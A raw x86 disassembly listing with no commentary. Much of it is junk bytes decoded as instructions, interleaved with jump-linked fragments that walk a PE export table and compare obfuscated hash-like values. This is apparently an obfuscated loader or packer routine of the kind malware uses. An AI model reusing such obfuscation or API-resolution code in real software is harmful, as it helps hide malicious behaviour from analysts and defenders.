  402103:	mov    dl,0x99
  402105:	jns    0x4020c7
  402107:	mov    al,0x68
  402109:	imul   esp,DWORD PTR [ebx],0x73a8c84b
  40210f:	aas    
  402110:	xchg   ebp,eax
  402111:	mov    edx,0x9a58d6ff
  402116:	push   ds
  402117:	mov    dh,0x47
  402119:	mov    WORD PTR [ebx],gs
  40211b:	rcr    cl,1
  40211d:	adc    dh,BYTE PTR [ebx-0x44dd581a]
  402123:	leave  
  402124:	ja     0x40218e
  402126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402127:	jae    0x4020f1
  402129:	sub    edx,DWORD PTR [esp+ebp*8+0x2b]
  40212d:	cmp    DWORD PTR [ebx+0x53],0xb3bb9d42
  402134:	push   ebx
  402135:	mov    ebx,0x214beaff
  40213a:	dec    eax
  40213b:	aam    0x8a
  40213d:	(bad)  
  40213e:	xor    DWORD PTR [eax+0x3a],ebp
  402141:	lahf   
  402142:	jl     0x402167
  402144:	sub    DWORD PTR [ecx-0x6d],ebp
  402147:	push   ss
  402148:	sub    BYTE PTR [esi],al
  40214a:	push   ss
  40214b:	cmp    esi,DWORD PTR [edx-0xe]
  40214e:	xor    eax,0x1082eb93
  402153:	(bad)  
  402154:	fdiv   QWORD PTR [edx+ebx*1+0x3adc3142]
  40215b:	push   esi
  40215c:	mov    dh,ch
  40215e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40215f:	lods   eax,DWORD PTR ds:[esi]
  402160:	dec    ebx
  402161:	adc    al,BYTE PTR [edx+0x73829e74]
  402167:	lahf   
  402168:	dec    edi
  402169:	mov    eax,0xbf24b039
  40216e:	inc    ebp
  40216f:	adc    DWORD PTR [edx],ebp
  402171:	dec    esp
  402172:	fwait
  402173:	jmp    0x1720c744
  402178:	mov    ecx,0x50f2911a
  40217d:	mov    al,ds:0x37c85c15
  402182:	in     eax,dx
  402183:	push   eax
  402184:	push   esp
  402185:	add    eax,DWORD PTR [eax+0x7e]
  402188:	repz dec ecx
  40218a:	fild   DWORD PTR [ecx-0x6a]
  40218d:	pop    ebp
  40218e:	pop    ds
  40218f:	(bad)  
  402190:	imul   edx,DWORD PTR [esi-0x30],0x713a8a28
  402197:	xchg   ecx,eax
  402198:	adc    ebp,ecx
  40219a:	(bad)
  40219d:	pop    ebx
  40219e:	fwait
  40219f:	lods   al,BYTE PTR ds:[esi]
  4021a0:	xor    BYTE PTR [edi-0x2f],cl
  4021a3:	mov    al,ds:0xb3b9f1cd
  4021a8:	sub    eax,eax
  4021aa:	xchg   esi,eax
  4021ab:	scas   al,BYTE PTR es:[edi]
  4021ac:	sahf   
  4021ad:	cmp    eax,DWORD PTR [edx-0x2727fde4]
  4021b3:	lods   al,BYTE PTR cs:[esi]
  4021b5:	(bad)
  4021b8:	and    al,0xd4
  4021ba:	pop    edi
  4021bb:	jno    0x402189
  4021bd:	rcr    BYTE PTR [ecx-0x471971d6],0x4c
  4021c4:	out    dx,al
  4021c5:	and    ebp,DWORD PTR [ebp+0x3b]
  4021c8:	les    ecx,FWORD PTR [esi+eax*1+0x18081680]
  4021cf:	push   ebx
  4021d0:	addr16 (bad) 
  4021d2:	jne    0x40217b
  4021d4:	stc    
  4021d5:	mov    ds:0xcf4a492b,al
  4021da:	sti    
  4021db:	inc    ebp
  4021dc:	jmp    0x98e0d68e
  4021e1:	jg     0x402198
  4021e3:	pop    esi
  4021e4:	adc    bh,bh
  4021e6:	fimul  WORD PTR ds:0x94bac4df
  4021ec:	push   ecx
  4021ed:	or     al,0xd4
  4021ef:	xor    eax,DWORD PTR [esi+0x21]
  4021f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021f3:	or     eax,0x708ac303
  4021f8:	nop
  4021f9:	mov    BYTE PTR [ebx-0x4bd11086],al
  4021ff:	xchg   BYTE PTR [eax-0x27689ce5],dl
  402205:	jg     0x4021e9
  402207:	inc    BYTE PTR [edx+0x254e7674]
  40220d:	pop    ds
  40220e:	call   0xfeeb:0x3853f876
  402215:	sub    al,0xe7
  402217:	stos   DWORD PTR es:[edi],eax
  402218:	sub    ebx,DWORD PTR [esi]
  40221a:	add    al,0xa8
  40221c:	pop    esp
  40221d:	test   eax,0xcadc894b
  402222:	mov    dl,0xab
  402224:	lds    edx,FWORD PTR [ebx-0x6cb33493]
  40222a:	mov    edi,0xc8746972
  40222f:	pop    eax
  402230:	push   0x6b
  402232:	jbe    0x4021fa
  402234:	jle    0x402266
  402236:	fbld   TBYTE PTR [eax-0x5d]
  402239:	sbb    al,0x1
  40223b:	mov    eax,0x2611a8bf
  402240:	adc    esp,DWORD PTR [edi]
  402242:	and    al,0x2b
  402244:	push   es
  402245:	sbb    BYTE PTR [ecx],al
  402247:	sahf   
  402248:	and    ch,dh
  40224a:	(bad)  
  40224b:	jo     0x4022b1
  40224d:	mov    ds:0x3dc7e986,al
  402252:	je     0x4022c6
  402254:	sub    al,0x28
  402256:	leave  
  402257:	inc    ebp
  402258:	add    cl,BYTE PTR [ebx-0x17a29745]
  40225e:	rcr    ebx,0x8c
  402261:	in     eax,dx
  402262:	add    eax,0x4d896626
  402267:	cld    
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	paddusb mm2,QWORD PTR [esi+0x4a]
  4022cd:	push   ds
  4022ce:	mov    dh,0x3
  4022d0:	jle    0x402350
  4022d2:	mov    ch,0x7f
  4022d4:	jle    0x402354
  4022d6:	dec    ebx
  4022d7:	test   DWORD PTR [edi-0x1b2918f5],0x67392518
  4022e1:	jae    0x40235c
  4022e3:	je     0x402347
  4022e5:	in     al,dx
  4022e6:	das    
  4022e7:	inc    esp
  4022e8:	push   eax
  4022e9:	ret    
  4022ea:	sbb    BYTE PTR [eax-0x45776e03],bh
  4022f0:	push   ecx
  4022f1:	mov    ds:0x9e8a4084,eax
  4022f6:	imul   ebp,esp,0xffffff8e
  4022f9:	inc    ecx
  4022fa:	fadd   DWORD PTR [ebp-0x60]
  4022fd:	pop    esp
  4022fe:	cmp    al,0xd5
  402300:	sub    cl,BYTE PTR [ecx]
  402302:	pushf  
  402303:	out    dx,al
  402304:	(bad)  
  402305:	(bad)  
  402306:	call   0x82d5fb5c
  40230b:	loope  0x402301
  40230d:	pop    edx
  40230e:	pop    esi
  40230f:	and    ebp,0xfffffff3
  402312:	xchg   esp,eax
  402313:	dec    edx
  402314:	mov    eax,ds:0x5af2b929
  402319:	daa    
  40231a:	mov    esi,0x448b6cb0
  40231f:	mov    edi,0x660d98f1
  402324:	pop    ds
  402325:	(bad)  
  402326:	stos   BYTE PTR es:[edi],al
  402327:	and    al,0x16
  402329:	cmp    ebx,DWORD PTR [edx+esi*1-0x56b8616a]
  402330:	les    edi,FWORD PTR [ecx+ebx*2]
  402333:	inc    esp
  402334:	fwait
  402335:	les    ebp,FWORD PTR [edx]
  402337:	xchg   edi,eax
  402338:	jle    0x4022bd
  40233a:	ror    al,1
  40233c:	(bad)  
  40233d:	xchg   ebp,eax
  40233e:	hlt    
  40233f:	or     DWORD PTR [edi+0x67],eax
  402342:	push   0x6f
  402344:	fisttp DWORD PTR gs:[ebp+0x2f469759]
  40234b:	mov    esi,DWORD PTR [esi+0x4573de18]
  402351:	out    0xd1,al
  402353:	mov    ebp,0x3251a49b
  402358:	clc    
  402359:	jmp    0x4023ce
  40235b:	iretw  
  40235d:	(bad)  
  40235e:	jo     0x40230c
  402360:	sbb    DWORD PTR [eax],0x994d252f
  402366:	xchg   BYTE PTR [edx],ch
  402368:	popa   
  402369:	retf   0x48b8
  40236c:	aaa    
  40236d:	mov    al,0xca
  40236f:	out    dx,eax
  402370:	imul   esp,DWORD PTR gs:[ecx-0x32900451],0x5f2b1845
  40237b:	jae    0x40232a
  40237d:	nop
  40237e:	repnz or BYTE PTR [ecx-0x48],0x51
  402383:	outs   dx,BYTE PTR ds:[esi]
  402384:	xchg   edi,eax
  402385:	fild   WORD PTR [edi-0x52]
  402388:	fidiv  DWORD PTR [ecx]
  40238a:	dec    eax
  40238b:	test   al,0x97
  40238d:	lods   al,BYTE PTR ds:[esi]
  40238e:	cmp    eax,0xdfd41292
  402393:	or     edx,0xffffffd2
  402396:	in     al,0xdf
  402398:	clc    
  402399:	sbb    al,0x87
  40239b:	xor    ah,bl
  40239d:	test   DWORD PTR ds:0xb7a9040e,eax
  4023a3:	jmp    0x4023ad
  4023a5:	int3   
  4023a6:	dec    edx
  4023a7:	sub    DWORD PTR [edi],ebp
  4023a9:	jnp    0x4023db
  4023ab:	pushf  
  4023ac:	pushf  
  4023ad:	mov    ebx,0x16a54b39
  4023b2:	jp     0x4023c6
  4023b4:	mov    cl,0x86
  4023b6:	(bad)  
  4023b8:	sub    BYTE PTR [ebx+0x7e2d0ef8],ah
  4023be:	jmp    0x4023a1
  4023c0:	adc    BYTE PTR [ecx],0x53
  4023c3:	sub    al,0x7e
  4023c5:	std    
  4023c6:	mov    ds:0x8d88d4f,eax
  4023cb:	xchg   esi,eax
  4023cc:	jg     0x4023f8
  4023ce:	jmp    0xc293:0x3ff20b45
  4023d5:	jmp    DWORD PTR [edx+0x70]
  4023d8:	xor    dl,BYTE PTR [eax]
  4023da:	adc    bl,ch
  4023dc:	test   BYTE PTR [eax+0x2386ff76],al
  4023e2:	sub    eax,0xf2ef672c
  4023e7:	mov    ds:0x36bf1da6,eax
  4023ec:	(bad)  
  4023ed:	pop    edx
  4023ee:	push   ebp
  4023ef:	bound  ebx,QWORD PTR [edi-0x3f]
  4023f2:	(bad)  
  4023f3:	fsub   QWORD PTR [eax]
  4023f5:	or     BYTE PTR [edi+0x74],ch
  4023f8:	rcl    DWORD PTR [edi+0x43],0xc8
  4023fc:	(bad)  
  4023fd:	xor    DWORD PTR ds:0x1554bcf5,esi
  402403:	adc    DWORD PTR [eax-0x71],0xe
  402407:	(bad)  
  402408:	call   FWORD PTR [ebx+0x30]
  40240b:	mov    bh,0x33
  40240d:	adc    DWORD PTR [ebp+0x63bb765e],0xffffffec
  402414:	mov    al,ds:0x2589e83c
  402419:	adc    al,0x16
  40241b:	push   ebx
  40241c:	loop   0x402401
  40241e:	pusha  
  40241f:	mov    bh,0xa3
  402421:	mov    al,0x26
  402423:	outs   dx,BYTE PTR ds:[esi]
  402424:	hlt    
  402425:	xor    eax,DWORD PTR [esi*2-0x3eea3fce]
  40242c:	std    
  40242d:	out    dx,al
  40242e:	int3   
  40242f:	xor    ecx,DWORD PTR [ebp+0x369cb88e]
  402435:	imul   ebx,esi,0x78523a18
  40243b:	mov    ebp,0xfd767807
  402440:	aam    0x9a
  402442:	xor    eax,0xb3a31647
  402447:	sbb    al,BYTE PTR [ebx+0x20aba34b]
  40244d:	sub    DWORD PTR [esi],ebx
  40244f:	aaa    
  402450:	and    DWORD PTR [edx+0x444cd8cf],0x65
  402457:	pop    ebx
  402458:	sbb    eax,0xe99fd0de
  40245d:	enter  0x4eb0,0xf4
  402461:	xor    dh,BYTE PTR [edx+0x7ffc92ed]
  402467:	mov    BYTE PTR [ebx-0x8],dh
  40246a:	mov    ds,edx
  40246c:	stc    
  40246d:	outs   dx,DWORD PTR ds:[esi]
  40246e:	jmp    0x5b2d:0x101e6b44
  402475:	fwait
  402476:	ds add al,0x78
  402479:	faddp  st(6),st
  40247b:	cs mov ah,0x9d
  40247e:	cmp    DWORD PTR [ebx-0x8],esp
  402481:	mov    edi,0x5f7dc2
  402486:	outs   dx,DWORD PTR ds:[esi]
  402487:	cmp    cl,BYTE PTR [ebx-0x438ca50d]
  40248d:	mov    ecx,DWORD PTR [ebp-0x8]
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0x38a9a00
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	out    dx,eax
  4024da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024db:	jmp    0x4024f0
  4024dd:	pop    ebp
  4024de:	aaa    
  4024df:	adc    DWORD PTR [edi],0xffffffca
  4024e2:	mov    al,0xe3
  4024e4:	in     eax,0x2c
  4024e6:	retf   0x4a3c
  4024e9:	sub    al,BYTE PTR [ebx-0x36]
  4024ec:	xor    DWORD PTR [edi-0xce9c566],eax
  4024f2:	ins    BYTE PTR es:[edi],dx
  4024f3:	or     BYTE PTR [ebp-0x2a],cl
  4024f6:	scas   al,BYTE PTR es:[edi]
  4024f7:	dec    eax
  4024f8:	sbb    bl,BYTE PTR [edx-0x48]
  4024fb:	and    al,0x12
  4024fd:	adc    ch,bh
  4024ff:	mov    dh,0x9e
  402501:	xor    eax,0x39e3193c
  402506:	int    0xba
  402508:	rol    BYTE PTR [edx+edi*1],1
  40250b:	sbb    eax,DWORD PTR [ebx-0x51]
  40250e:	cld    
  40250f:	jge    0x402505
  402511:	stc    
  402512:	mov    dh,0x7f
  402514:	int3   
  402515:	pop    ecx
  402516:	and    BYTE PTR [eax-0x7f],0xd0
  40251a:	ds repz dec ebp
  40251d:	jb     0x40254a
  40251f:	pop    ebp
  402520:	cmp    DWORD PTR [esi],edi
  402522:	ss pop eax
  402524:	mov    ecx,0xac0c7c4
  402529:	pop    esi
  40252a:	cmp    DWORD PTR [edx+0x3e66796f],0xe3177de1
  402534:	mov    esp,edx
  402536:	les    eax,FWORD PTR [ebx+0x348ae95f]
  40253c:	cmp    ebp,DWORD PTR [eax]
  40253e:	or     al,BYTE PTR [ecx+0x686af08e]
  402544:	repnz das 
  402546:	pop    edx
  402547:	mov    bh,0x72
  402549:	sbb    BYTE PTR [edi-0x1f460d1e],ah
  40254f:	cli    
  402550:	inc    esi
  402551:	ss and al,0x94
  402554:	mov    dl,0x6b
  402556:	arpl   WORD PTR [esp+eax*4+0x72],si
  40255a:	(bad)  
  40255b:	mov    edi,0x5e7f1639
  402560:	scas   eax,DWORD PTR es:[edi]
  402561:	ja     0x402580
  402563:	outs   dx,DWORD PTR ds:[esi]
  402564:	shr    DWORD PTR [esi+0x24b1c975],0xcf
  40256b:	xchg   ebx,eax
  40256c:	jecxz  0x40258e
  40256e:	pop    esi
  40256f:	shl    DWORD PTR [ebp+0x59a1901e],0xb1
  402576:	int3   
  402577:	lea    eax,ds:0xbd9dc993
  40257d:	test   eax,0x679c073b
  402582:	jmp    0x53ee:0xc8938c40
  402589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40258a:	pop    ebx
  40258b:	mov    bl,0x9e
  40258d:	adc    eax,0xb5c9065d
  402592:	cli    
  402593:	adc    DWORD PTR [ebx+edi*8],esi
  402596:	sub    dh,0x97
  402599:	and    eax,0x8fc7ca4b
  40259e:	pop    es
  40259f:	int    0xd5
  4025a1:	dec    ebx
  4025a2:	bound  ebx,QWORD PTR [ebp+0x51171e1]
  4025a8:	jns    0x402547
  4025aa:	je     0x402570
  4025ac:	sub    ebx,edx
  4025ae:	mov    bl,bh
  4025b0:	lea    ebp,[edi+0x643232c8]
  4025b6:	cmp    BYTE PTR [ecx+ecx*8-0x64],bh
  4025ba:	sbb    DWORD PTR [eax],0x5f26979a
  4025c0:	pop    esp
  4025c1:	push   cs
  4025c2:	ror    BYTE PTR [ecx-0x2ce1eaec],0x86
  4025c9:	push   edx
  4025ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025cb:	daa    
  4025cc:	cmp    DWORD PTR [esi],ecx
  4025ce:	jg     0x4025b5
  4025d0:	adc    al,BYTE PTR [edi-0x42]
  4025d3:	cmp    al,0xd2
  4025d5:	sbb    eax,0xa981ce7c
  4025da:	mov    ecx,0x28d99803
  4025df:	mov    al,fs:0xabdbe111
  4025e5:	pop    eax
  4025e6:	repnz ds cmp al,0x69
  4025ea:	adc    eax,0xc69a80e2
  4025ef:	cwde   
  4025f0:	xchg   esp,eax
  4025f1:	aam    0xa0
  4025f3:	in     eax,dx
  4025f4:	mov    ah,0x35
  4025f6:	pop    esp
  4025f7:	dec    eax
  4025f8:	dec    DWORD PTR [edi+0x34d108b]
  4025fe:	push   0x1ab043b5
  402603:	imul   edx,DWORD PTR [edi+ecx*1+0x68],0xffffff89
  402608:	pop    ds
  402609:	retf   
  40260a:	cld    
  40260b:	mov    dh,0xf7
  40260d:	jb     0x4025cb
  40260f:	(bad)  
  402611:	pop    ds
  402612:	sbb    al,0x6f
  402614:	shl    al,0xee
  402617:	push   ebp
  402618:	les    ebp,FWORD PTR [edi+0x8]
  40261b:	ficom  WORD PTR [edi-0xa5c2d4f]
  402621:	adc    al,0xdc
  402623:	inc    DWORD PTR [eax]
  402625:	dec    esi
  402626:	inc    esi
  402627:	test   BYTE PTR [esi],ch
  402629:	jnp    0x4025bc
  40262b:	mov    BYTE PTR [edi],bl
  40262d:	test   BYTE PTR [edx+esi*8+0xb],dh
  402631:	or     edi,ebx
  402633:	fwait
  402634:	mov    eax,ds:0xb76c98b3
  402639:	fld    QWORD PTR [edx-0x4c]
  40263c:	es mov ah,0x6a
  40263f:	xchg   DWORD PTR [edx-0x573ff50f],ebx
  402645:	inc    esp
  402646:	mov    ds:0x4380974,eax
  40264b:	xor    edx,DWORD PTR [eax]
  40264d:	push   edx
  40264e:	ja     0x402698
  402650:	inc    ebx
  402651:	sbb    DWORD PTR [ecx+0x3647359a],edx
  402657:	sti    
  402658:	clc    
  402659:	dec    ebx
  40265a:	es push es
  40265c:	add    dl,BYTE PTR [esi]
  40265e:	cli    
  40265f:	mov    ds:0x16a0740d,eax
  402664:	(bad)  
  402665:	popf   
  402666:	push   edi
  402667:	mov    WORD PTR [ebp-0x21],gs
  40266a:	ins    BYTE PTR es:[edi],dx
  40266b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40266c:	xor    DWORD PTR [ebx+0x0],edi
  40266f:	fmulp  st(7),st
  402671:	imul   esp,DWORD PTR [eax],0x541e76d5
  402677:	sub    DWORD PTR [edx],ecx
  402679:	push   ecx
  40267a:	(bad)  
  40267b:	fmul   st(5),st
  40267d:	cmc    
  40267e:	and    bl,BYTE PTR [ebp-0x7fbad10e]
  402684:	in     al,dx
  402685:	push   edi
  402686:	xchg   BYTE PTR [esi],bl
  402688:	clc    
  402689:	mov    esp,0x53338600
  40268e:	xchg   ebx,eax
  40268f:	xor    eax,0x8be04d89
  402694:	inc    ebp
  402695:	loopne 0x402622
  402697:	dec    ebp
  402698:	clc    
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0xb
  4026c9:	shl    BYTE PTR [ebp+0x7e0f24f8],0x7e
  4026d0:	mov    ch,0x7f
  4026d2:	jle    0x402752
  4026d4:	mov    es,edx
  4026d6:	cmp    eax,0x2cdbbc1c
  4026db:	pop    eax
  4026dc:	shl    BYTE PTR [ecx-0x44],cl
  4026df:	test   eax,0xd439266b
  4026e4:	std    
  4026e5:	addr16 mov ebp,0xc43ffa01
  4026eb:	mov    ah,0x2
  4026ed:	test   BYTE PTR [eax+eiz*8+0x27e61d68],cl
  4026f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026f5:	dec    edx
  4026f6:	stos   DWORD PTR es:[edi],eax
  4026f7:	shl    ebp,0xd8
  4026fa:	cs xchg ebx,eax
  4026fc:	hlt    
  4026fd:	iret   
  4026fe:	sbb    BYTE PTR [ebx-0x37],bh
  402701:	mov    al,ds:0xc867b57f
  402706:	stos   DWORD PTR es:[edi],eax
  402707:	add    esi,DWORD PTR ds:[ecx+0x213908a3]
  40270e:	dec    ebp
  40270f:	nop
  402710:	jne    0x402711
  402712:	shl    DWORD PTR [ebx-0x5bb42774],0xc7
  402719:	add    dh,0xa9
  40271c:	test   DWORD PTR ds:0x62d604ba,edx
  402722:	nop
  402723:	paddsw mm2,mm7
  402726:	loopne 0x40276c
  402728:	add    esi,esi
  40272a:	int3   
  40272b:	stc    
  40272c:	mov    dl,0x94
  40272e:	mov    ebp,0xadd2917d
  402733:	retf   0x395b
  402736:	retfw  
  402738:	shl    BYTE PTR [edx-0x1b12b619],cl
  40273e:	pop    ss
  40273f:	fistp  WORD PTR ds:0xf6e739b6
  402745:	xchg   esp,eax
  402746:	or     si,WORD PTR [ebx-0x7d69e8e2]
  40274d:	pop    edi
  40274e:	int3   
  40274f:	adc    eax,0x79482f05
  402754:	inc    edi
  402755:	fistp  DWORD PTR [ecx]
  402757:	adc    al,0xc0
  402759:	(bad)  
  40275a:	out    0x7c,al
  40275c:	out    dx,al
  40275d:	jo     0x4026e8
  40275f:	aaa    
  402760:	adc    BYTE PTR [ebx],ah
  402762:	hlt    
  402763:	fst    QWORD PTR [eax]
  402765:	xor    al,0xea
  402767:	mov    eax,0x8d69fbf6
  40276c:	lods   al,BYTE PTR ds:[esi]
  40276d:	jg     0x402786
  40276f:	jae    0x40275a
  402771:	pop    eax
  402772:	addr16 retf 
  402774:	jge    0x40274c
  402776:	pop    ecx
  402777:	outs   dx,DWORD PTR ds:[esi]
  402778:	ffreep st(0)
  40277a:	popa   
  40277b:	xor    al,0xcd
  40277d:	fisubr DWORD PTR [edx]
  40277f:	push   cs
  402780:	outs   dx,BYTE PTR ds:[esi]
  402781:	and    edi,edx
  402783:	out    0xe6,eax
  402785:	add    dl,cl
  402787:	xchg   esp,eax
  402788:	xor    al,0x58
  40278a:	gs sub al,0xbe
  40278d:	out    dx,al
  40278e:	test   DWORD PTR [eax+0x3b],edx
  402791:	push   edi
  402792:	ds mov cl,0xc4
  402795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402796:	lods   al,BYTE PTR ds:[esi]
  402797:	adc    al,0xfb
  402799:	test   DWORD PTR ds:0xdcf80107,ebp
  40279f:	or     DWORD PTR [edx-0x40],ebx
  4027a2:	lahf   
  4027a3:	cmp    edi,ebx
  4027a5:	push   ebx
  4027a6:	sbb    BYTE PTR [edi-0x5a],ch
  4027a9:	into   
  4027aa:	aad    0x60
  4027ac:	pop    eax
  4027ad:	ins    BYTE PTR es:[edi],dx
  4027ae:	in     al,0xd6
  4027b0:	sbb    bl,bh
  4027b2:	daa    
  4027b3:	sub    ebx,DWORD PTR [edx+0x42]
  4027b6:	pop    ss
  4027b7:	jae    0x402787
  4027b9:	ins    DWORD PTR es:[edi],dx
  4027ba:	add    eax,0x567bcd84
  4027bf:	(bad)  
  4027c0:	mov    ah,0x33
  4027c2:	stos   BYTE PTR es:[edi],al
  4027c3:	stc    
  4027c4:	inc    ecx
  4027c5:	mov    ecx,0xa1894b2d
  4027ca:	daa    
  4027cb:	jo     0x40281e
  4027cd:	stos   DWORD PTR es:[edi],eax
  4027ce:	js     0x402799
  4027d0:	push   es
  4027d1:	pop    ecx
  4027d2:	sub    BYTE PTR cs:[ecx+0x30],0x84
  4027d7:	scas   al,BYTE PTR es:[edi]
  4027d8:	scas   al,BYTE PTR es:[edi]
  4027d9:	or     DWORD PTR [esi+0x4c013b9b],esp
  4027df:	stos   BYTE PTR es:[edi],al
  4027e0:	into   
  4027e1:	(bad)  
  4027e2:	cli    
  4027e3:	sub    ecx,DWORD PTR [ecx-0x295d3766]
  4027e9:	dec    ebx
  4027ea:	jno    0x402786
  4027ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027ed:	scas   eax,DWORD PTR es:[edi]
  4027ee:	addr16 mov eax,cs:0x33c5
  4027f3:	sbb    eax,DWORD PTR [ebx-0x5]
  4027f6:	dec    ebx
  4027f7:	daa    
  4027f8:	fsub   QWORD PTR [ebp-0x2d71d1b4]
  4027fe:	fcmove st,st(3)
  402800:	in     al,dx
  402801:	and    DWORD PTR [esi+0xa2bac56],esi
  402807:	fmul   DWORD PTR [edi+0x70612b36]
  40280d:	(bad)  
  40280e:	call   0x64db:0x3e1283c2
  402815:	scas   eax,DWORD PTR es:[edi]
  402816:	pop    ecx
  402817:	in     al,dx
  402818:	mov    DWORD PTR [ebp+0x31],0x96ae4185
  40281f:	rol    ah,1
  402821:	ret    0xc007
  402824:	push   ebp
  402825:	mov    bl,0x7a
  402827:	xchg   ebp,eax
  402828:	daa    
  402829:	mov    dl,BYTE PTR [ebx-0x7d]
  40282c:	push   eax
  40282d:	push   ebp
  40282e:	dec    ebx
  40282f:	test   eax,0xcbecc560
  402834:	adc    eax,0x3b8eb749
  402839:	mov    esp,0xbcb625a0
  40283e:	dec    edx
  40283f:	sbb    al,0x6a
  402841:	aaa    
  402842:	mov    ebx,0x2f1d8efd
  402847:	outs   dx,BYTE PTR ds:[esi]
  402848:	mov    ebx,0x425b1f8b
  40284d:	scas   al,BYTE PTR es:[edi]
  40284e:	xor    al,0xae
  402850:	mov    dl,bh
  402852:	shr    bl,cl
  402854:	in     eax,0xa5
  402856:	cmp    eax,0x8f73bd29
  40285b:	(bad)  
  40285d:	ds loopne 0x402873
  402860:	pop    ebx
  402861:	add    DWORD PTR [eax*2+0x45eda913],ebp
  402868:	es mov ebp,0xceeb017b
  40286e:	data16 aad 0x36
  402871:	int3   
  402872:	les    ecx,FWORD PTR [edx]
  402874:	add    DWORD PTR [ebx],ebx
  402876:	popa   
  402877:	adc    al,0x16
  402879:	add    DWORD PTR [eax+0x75faf71c],edx
  40287f:	ffree  st(7)
  402881:	push   esp
  402882:	aam    0x9d
  402884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402885:	mov    ebx,0xe3c981a7
  40288a:	jns    0x651191
  402890:	add    BYTE PTR [eax],al
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax+0x42de0451]
  4028ec:	push   DWORD PTR [esi]
  4028ee:	push   0x7e7e0853
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x4028c1
  4028f8:	test   al,0x26
  4028fa:	mov    ebx,0x8356a873
  4028ff:	fsub   DWORD PTR ds:0xeb764a38
  402905:	dec    ebp
  402906:	popf   
